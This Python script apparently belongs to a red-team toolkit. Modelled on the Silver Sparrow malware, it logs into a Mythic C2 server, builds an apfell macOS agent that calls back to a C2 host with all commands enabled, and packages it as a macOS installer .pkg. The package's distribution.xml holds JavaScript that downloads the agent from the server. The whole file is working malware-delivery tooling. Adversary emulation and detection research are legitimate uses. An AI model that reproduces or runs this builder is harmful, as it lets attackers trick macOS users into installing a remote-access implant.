# Adapted from https://redcanary.com/blog/clipping-silver-sparrows-wings/

import shutil, errno, os
from mythic import *
from sys import exit
from os import system
from Settings.MythicSettings import *

def install_js():
    temp = "./Templates/Installer_Package_JS/"
    payload = "./Payloads/Installer_Package_JS_Payload" 

    def copyanything(src, dst):
        try:
            shutil.copytree(src, dst)
            print("[+] Copied Template Folder to '% s'" % payload)
        except OSError as error:
        	shutil.rmtree(dst)
        	shutil.copytree(src, dst)
        	print("[+] Overwrote files '%s'" % payload)

    copyanything(temp,payload)    

    ## Create apfell payload
    async def scripting():
        mythic = mythic_rest.Mythic(
            username=mythic_username,
            password=mythic_password,
            server_ip=mythic_server_ip,
            server_port=mythic_server_port,
            ssl=mythic_ssl,
            global_timeout=-1,
        )
        print("[+] Logging into Mythic")
        await mythic.login()
        await mythic.set_or_create_apitoken()
        # define what our payload should be
        p = mythic_rest.Payload(
            payload_type="apfell", 
            c2_profiles={
                "http":[
                        {"name": "callback_host", "value": mythic_http_callback_host},
                        {"name": "callback_interval", "value": mythic_http_callback_interval}
                    ]
                },
            tag="Installer Pkg with JS Functionality",
            selected_os="macOS",
            # if we want to only include specific commands, put them here:
            #commands=["cmd1", "cmd2", "cmd3"],
            filename="Installer_with_JavaScript.js")
        print("[+] Creating new apfell payload")
        # create the payload and include all commands
        # if we define commands in the payload definition, then remove the all_commands=True piece
        resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)

        print("[*] Building Installer Package JS Payload")
        payloadDownloadid = resp.response.file_id.agent_file_id
  
        #Replace template values
        url = "https://" + mythic_server_ip + ":" + mythic_server_port + "/api/v1.4/files/download/" + payloadDownloadid #modify to point to desired location
        
        templateString = "URL"
        fin = open(payload + "/distribution.xml", "rt")
        data = fin.read()
        data = data.replace(templateString, url)
        fin.close()
        fin = open(payload + "/distribution.xml", "wt")
        fin.write(data)
        fin.close()

        os.system("pkgbuild --identifier simple.test --nopayload " + payload + "/install.pkg")
        os.system("productbuild --distribution " + payload + "/distribution.xml " + "--package-path " + payload + "/install.pkg " + payload+ "/JSpackage.pkg")

        print("[+] Built Installer Package Payload w/ JavaScript as JSpackage.pkg")

    async def main():
        await scripting()
        try:
            while True:
                pending = mythic_rest.asyncio.all_tasks()
                plist = []
                for p in pending:
                    if p._coro.__name__ != "main" and p._state == "PENDING":
                        plist.append(p)
                if len(plist) == 0:
                    exit(0)
                else:
                    await mythic_rest.asyncio.gather(*plist)
        except KeyboardInterrupt:
            pending = mythic_rest.asyncio.all_tasks()
            for t in pending:
                t.cancel()    

    loop = mythic_rest.asyncio.get_event_loop()
    loop.run_until_complete(main())
